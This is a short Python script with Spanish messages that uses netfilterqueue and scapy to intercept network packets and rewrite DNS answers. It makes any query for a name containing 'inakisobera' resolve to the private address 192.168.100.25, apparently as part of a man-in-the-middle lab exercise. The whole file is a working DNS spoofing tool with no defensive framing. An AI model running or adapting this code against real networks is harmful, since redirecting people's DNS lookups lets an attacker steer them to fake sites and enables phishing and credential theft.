#!/usr/bin/env python3 

import netfilterqueue
import os
import scapy.all as scapy
from termcolor import colored
import signal

def senial(s,f):
    print(colored("[!] salliendo", "red"))
    os._exit(1)


signal.signal(signal.SIGINT, senial)

def proces(pk):
    scapy_pk = scapy.IP(pk.get_payload())

    if scapy_pk.haslayer(scapy.DNSQR):
        qname = scapy_pk[scapy.DNSQR].qname

        if b'inakisobera' in qname:
            print(f'Envenenando el dominio {qname}')

            # Construyendo la respuesta envenenada:
            respuesta = scapy.DNSRR(rrname=qname, rdata='192.168.100.25')

            scapy_pk[scapy.DNS].an = respuesta
            scapy_pk[scapy.DNS].ancount = 1


            del scapy_pk[scapy.IP].len
            del scapy_pk[scapy.IP].chksum
            del scapy_pk[scapy.UDP].len
            del scapy_pk[scapy.UDP].chksum

            print(scapy_pk.show())

            pk.set_payload(scapy_pk.build())

    pk.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, proces)
queue.run()
